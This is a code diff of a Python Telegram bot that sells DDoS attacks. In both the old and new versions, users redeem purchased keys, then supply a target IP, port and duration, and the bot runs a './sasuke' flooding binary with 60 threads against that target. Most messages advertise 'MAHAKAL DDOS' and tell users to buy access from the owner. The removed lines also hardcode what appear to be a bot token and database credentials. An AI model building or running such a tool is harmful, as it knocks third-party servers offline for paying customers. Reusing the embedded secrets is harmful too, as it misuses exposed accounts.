@@ -1,168 +1,315 @@
-import telebot
-import logging
+#API_SAUKE
+#SASUKE_FOEMAT
+#BYSasUKE_API_KEY FAVDAUTCREHY
+#OWNER - @Mahakal1814
+#KEY_REDEMPTION_1711
+#ACCESS_KEY_1711
+#FA ILED_SasUKE_1711
+#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
+#JOIN - @Mahakal1814
+#CHANNEL- @Mahakal1814
+
 import subprocess
-from pymongo import MongoClient
-from datetime import datetime, timedelta
-import certifi
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+import json
+import os
+import random
+import string
+import datetime
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME
+from telegram import ReplyKeyboardMarkup, KeyboardButton  # Import these for the buttons
 
-TOKEN = '7326172590:AAF-m0nnmtHZTh7AncZjDv_vxzFc1uexW6I'
-MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
-CHANNEL_ID = -1002444210076
-ADMIN_IDS = [5056902784 , 757915155]
+from keep_alive import keep_alive
+keep_alive()
+
+USER_FILE = "users.json"
+KEY_FILE = "keys.json"
+
+flooding_process = None
+flooding_command = None
 
 
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['sharp']
-users_collection = db.users
-bot = telebot.TeleBot(TOKEN)
-blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-user_attack_details = {}
-active_attacks = {}
-def run_attack_command_sync(user_id, target_ip, target_port, action):
+DEFAULT_THREADS = 60
+
+
+users = {}
+keys = {}
+
+
+def load_data():
+    global users, keys
+    users = load_users()
+    keys = load_keys()
+
+def load_users():
     try:
-        if action == 1:
-            process = subprocess.Popen(['./sasuke', target_ip, port, duration, str(DEFAULT_THREADS)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            active_attacks[(user_id, target_ip, target_port)] = process.pid
-        elif action == 2:
-            pid = active_attacks.pop((user_id, target_ip, target_port), None)
-            if pid:
-                subprocess.run(["kill", str(pid)], check=True)
+        with open(USER_FILE, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return {}
     except Exception as e:
-        logging.error(f"Error in run_attack_command_sync: {e}")
-def is_user_admin(user_id, chat_id):
+        print(f"Error loading users: {e}")
+        return {}
+
+def save_users():
+    with open(USER_FILE, "w") as file:
+        json.dump(users, file)
+
+def load_keys():
     try:
-        chat_member = bot.get_chat_member(chat_id, user_id)
-        return chat_member.status in ['administrator', 'creator'] or user_id in ADMIN_IDS
+        with open(KEY_FILE, "r") as file:
+            return json.load(file)
+    except FileNotFoundError:
+        return {}
     except Exception as e:
-        logging.error(f"Error checking admin status: {e}")
-        return False
+        print(f"Error loading keys: {e}")
+        return {}
 
-def check_user_approval(user_id):
-    try:
-        user_data = users_collection.find_one({"user_id": user_id})
-        if user_data and user_data['plan'] > 0:
-            valid_until = user_data.get('valid_until', "")
-            return valid_until == "" or datetime.now().date() <= datetime.fromisoformat(valid_until).date()
-        return False
-    except Exception as e:
-        logging.error(f"Error in checking user approval: {e}")
-        return False
+def save_keys():
+    with open(KEY_FILE, "w") as file:
+        json.dump(keys, file)
 
+def generate_key(length=6):
+    characters = string.ascii_letters + string.digits
+    return ''.join(random.choice(characters) for _ in range(length))
 
-def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED @Mahakal1814*", parse_mode='Markdown')
-
-def send_main_buttons(chat_id):
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    markup.add(KeyboardButton("/Attack"), KeyboardButton("Start Attack"), KeyboardButton("Stop Attack"))
-    bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')
-,
-
-@bot.message_handler(commands=['approve'])
-def approve_user(message):
-    if not is_user_admin(message.from_user.id, message.chat.id):
-        bot.send_message(message.chat.id, "*You are not authorized to use this command Owner @Mahakal1814*", parse_mode='Markdown')
-        return
-
-    try:
-        cmd_parts = message.text.split()
-        if len(cmd_parts) != 4:
-            bot.send_message(message.chat.id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
-            return
-
-        target_user_id = int(cmd_parts[1])
-        plan = int(cmd_parts[2])
-        days = int(cmd_parts[3])
-
-        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
-            upsert=True
-        )
-        bot.send_message(message.chat.id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
-    except Exception as e:
-        bot.send_message(message.chat.id, "*PLS ENTER CORRECT MAHAKAL BHAI *", parse_mode='Markdown')
-        logging.error(f"Error in approving user: {e}")
-
-
-@bot.message_handler(commands=['disapprove'])
-def disapprove_user(message):
-    if not is_user_admin(message.from_user.id, message.chat.id):
-        bot.send_message(message.chat.id, "*You are not authorized to use this command Owner @Mahakal1814*", parse_mode='Markdown')
-        return
-
-    try:
-        cmd_parts = message.text.split()
-        if len(cmd_parts) != 2:
-            bot.send_message(message.chat.id, "*Invalid command format. Use /disapprove <user_id>*", parse_mode='Markdown')
-            return
-
-        target_user_id = int(cmd_parts[1])
-        users_collection.update_one(
-            {"user_id": target_user_id},
-            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
-            upsert=True
-        )
-        bot.send_message(message.chat.id, f"*User {target_user_id} disapproved and reverted to free.*", parse_mode='Markdown')
-    except Exception as e:
-        bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
-        logging.error(f"Error in disapproving user: {e}")
-
-@bot.message_handler(commands=['Attack'])
-def attack_command(message):
-    if not check_user_approval(message.from_user.id):
-        send_not_approved_message(message.chat.id)
-        return
-
-    bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_attack_ip_port)
-
-def process_attack_ip_port(message):
-    try:
-        args = message.text.split()
-        if len(args) != 2:
-            bot.send_message(message.chat.id, "*Invalid format. Provide both target IP and port.*", parse_mode='Markdown')
-            return
-
-        target_ip, target_port = args[0], int(args[1])
-        if target_port in blocked_ports:
-            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Use another port.*", parse_mode='Markdown')
-            return
-
-        user_attack_details[message.from_user.id] = (target_ip, target_port)
-        send_main_buttons(message.chat.id)
-    except Exception as e:
-        bot.send_message(message.chat.id, "*PLS ENTER CORRECT *", parse_mode='Markdown')
-        logging.error(f"Error in processing attack IP and port: {e}")
-
-@bot.message_handler(func=lambda message: message.text == "Start Attack")
-def start_attack(message):
-    attack_details = user_attack_details.get(message.from_user.id)
-    if attack_details:
-        target_ip, target_port = attack_details
-        run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
-        bot.send_message(message.chat.id, f"*Attack started on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
+def add_time_to_current_date(hours=0, days=0):
+    return (datetime.datetime.now() + datetime.timedelta(hours=hours, days=days)).strftime('%Y-%m-%d %H:%M:%S')
+#API_SAUKE
+#SASUKE_FOEMAT
+#BYSasUKE_API_KEY FAVDAUTCREHY
+#OWNER - @BeasTxt_Sasuke
+#KEY_REDEMPTION_1711
+#ACCESS_KEY_1711
+#FAILED_SasUKE_1711
+#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
+#JOIN - @bgmisellingbuying
+#CHANNEL- @StoRm_BGMI_HACKS_STORE
+# Command to generate keys
+async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        command = context.args
+        if len(command) == 2:
+            try:
+                time_amount = int(command[0])
+                time_unit = command[1].lower()
+                if time_unit == 'hours':
+                    expiration_date = add_time_to_current_date(hours=time_amount)
+                elif time_unit == 'days':
+                    expiration_date = add_time_to_current_date(days=time_amount)
+                else:
+                    raise ValueError("Invalid time unit")
+                key = generate_key()
+                keys[key] = expiration_date
+                save_keys()
+                response = f"Key generated: {key}\nExpires on: {expiration_date}"
+            except ValueError:
+                response = f"Please specify a valid number and unit of time (hours/days) script by OWNER- @Mahakal1814..."
+        else:
+            response = "Usage: /genkey <amount> <hours/days>"
     else:
-        bot.send_message(message.chat.id, "*No target specified. Use /Attack to set it up.*", parse_mode='Markdown')
+        response = f"ONLY OWNER CAN USE💀OWNER OWNER- @Mahakal1814..."
 
-@bot.message_handler(func=lambda message: message.text == "Stop Attack")
-def stop_attack(message):
-    attack_details = user_attack_details.get(message.from_user.id)
-    if attack_details:
-        target_ip, target_port = attack_details
-        run_attack_command_sync(message.from_user.id, target_ip, target_port, 2)
-        bot.send_message(message.chat.id, f"*Attack stopped on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
-        user_attack_details.pop(message.from_user.id, None)
+    await update.message.reply_text(response)
+
+#API_SAUKE
+#SASUKE_FOEMAT
+#BYSasUKE_API_KEY FAVDAUTCREHY
+#OWNER - @Mahakal1814
+#KEY_REDEMPTION_1711
+#ACCESS_KEY_1711
+#FAILED_SasUKE_1711
+#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
+#JOIN - @Mahakal1814
+#CHANNEL- @Mahakal1814
+async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    command = context.args
+    if len(command) == 1:
+        key = command[0]
+        if key in keys:
+            expiration_date = keys[key]
+            if user_id in users:
+                user_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
+                new_expiration_date = max(user_expiration, datetime.datetime.now()) + datetime.timedelta(hours=1)
+                users[user_id] = new_expiration_date.strftime('%Y-%m-%d %H:%M:%S')
+            else:
+                users[user_id] = expiration_date
+            save_users()
+            del keys[key]
+            save_keys()
+            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @Mahakal1814..."
+        else:
+            response = f"Invalid or expired key buy from OWNER- @Mahakal1814..."
     else:
-        bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')
+        response = f"Usage: /redeem <key> if you don't  have  buy from  @Mahakal1814..."
 
-@bot.message_handler(commands=['start'])
-def start_command(message):
-    send_main_buttons(message.chat.id)
+    await update.message.reply_text(response)
 
-if __name__ == "__main__":
-    logging.info("Starting bot...\nMade BY @DAKSHSTORE1")
-    bot.polling(none_stop=True)
+
+async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        if users:
+            response = "Authorized Users:\n"
+            for user_id, expiration_date in users.items():
+                try:
+                    user_info = await context.bot.get_chat(int(user_id))
+                    username = user_info.username if user_info.username else f"UserID: {user_id}"
+                    response += f"- @{username} (ID: {user_id}) expires on {expiration_date}\n"
+                except Exception:
+                    response += f"- User ID: {user_id} expires on {expiration_date}\n"
+        else:
+            response = f"No data found OWNER- @Mahakal1814 ..."
+    else:
+        response = f"ONLY OWNER CAN USE.OWNER- @Mahakal1814..."
+    await update.message.reply_text(response)
+
+
+async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global flooding_command
+    user_id = str(update.message.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.")
+        return
+
+    if len(context.args) != 3:
+        await update.message.reply_text('Usage: /bgmi <target_ip> <port> <duration>')
+        return
+
+    target_ip = context.args[0]
+    port = context.args[1]
+    duration = context.args[2]
+
+    flooding_command = ['./sasuke', target_ip, port, duration, str(DEFAULT_THREADS)]
+    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')
+
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global flooding_process, flooding_command
+    user_id = str(update.message.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key OWNER @Mahakal1814.")
+        return
+
+    if flooding_process is not None:
+        await update.message.reply_text('Flooding is already running.')
+        return
+
+    if flooding_command is None:
+        await update.message.reply_text('No flooding parameters set. Use /bgmi to set parameters.')
+        return
+
+    flooding_process = subprocess.Popen(flooding_command)
+    await update.message.reply_text('🚀𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 MAHAKAL DDOS...🚀')
+
+
+async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    global flooding_process
+    user_id = str(update.message.from_user.id)
+
+    if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key Owner @Mahakal1814.")
+        return
+
+    if flooding_process is None:
+        await update.message.reply_text('No flooding process is running.')
+        return
+
+    flooding_process.terminate()
+    flooding_process = None
+    await update.message.reply_text('𝑨𝑻𝑻𝑨𝑪𝑲 𝑺𝑻𝑶𝑷𝑬𝑫 MAHAKAL DDOS...✅')
+
+
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.message.from_user.id)
+    if user_id in ADMIN_IDS:
+        message = ' '.join(context.args)
+        if not message:
+            await update.message.reply_text('Usage: /broadcast <message>')
+            return
+
+        for user in users.keys():
+            try:
+                await context.bot.send_message(chat_id=int(user), text=message)
+            except Exception as e:
+                print(f"Error sending message to {user}: {e}")
+        response = "Message sent to all users."
+    else:
+        response = "ONLY OWNER CAN USE."
+    
+    await update.message.reply_text(response)
+
+
+#API_SAUKE
+#SASUKE_FOEMAT
+#BYSasUKE_API_KEY FAVDAUTCREHY
+#OWNER - @Mahakal1814
+#KEY_REDEMPTION_1711
+#ACCESS_KEY_1711
+#FAILED_SasUKE_1711
+#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
+#JOIN - @Mahakal1814
+#CHANNEL- @Mahakal1814
+
+# Update the help_command function to include buttons
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    # Create buttons
+    markup = ReplyKeyboardMarkup(
+        [
+            [KeyboardButton("/bgmi"), KeyboardButton("/start")],
+            [KeyboardButton("/stop")]
+        ],
+        resize_keyboard=True
+    )
+
+    # Message with options
+    response = (
+        "Welcome to the Flooding Bot by OWNER- @Mahakal1814...! Here are the available commands:\n\n"
+        "Admin Commands:\n"
+        "/genkey <amount> <hours/days> - Generate a key with a specified validity period.\n"
+        "/allusers - Show all authorized users.\n"
+        "/broadcast <message> - Broadcast a message to all authorized users.\n\n"
+        "User Commands:\n"
+        "/redeem <key> - Redeem a key to gain access.\n"
+        "/bgmi <target_ip> <port> <duration> - Set the flooding parameters.\n"
+        "/start - Start the flooding process.\n"
+        "/stop - Stop the flooding process.\n"
+    )
+
+    # Send message with the keyboard buttons
+    await update.message.reply_text(response, reply_markup=markup)
+
+def main() -> None:
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+
+    application.add_handler(CommandHandler("genkey", genkey))
+    application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("allusers", allusers))
+    application.add_handler(CommandHandler("bgmi", bgmi))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("stop", stop))
+    application.add_handler(CommandHandler("broadcast", broadcast))
+    application.add_handler(CommandHandler("help", help_command))
+
+    load_data()
+    application.run_polling()
+
+if __name__ == '__main__':
+    main()
+
+#API_SAUKE
+#SASUKE_FOEMAT
+#BYSasUKE_API_KEY FAVDAUTCREHY
+#OWNER - @Mahakal1814
+#KEY_REDEMPTION_1711
+#ACCESS_KEY_1711
+#FAILED_SasUKE_1711
+#HFAHYOYO_YTIATII_1575757_AS4575AA_57A7ASUYUT_WUUTIUU_4687_1711
+#JOIN - @Mahakal1814
+#CHANNEL- @Mahakal1814
+
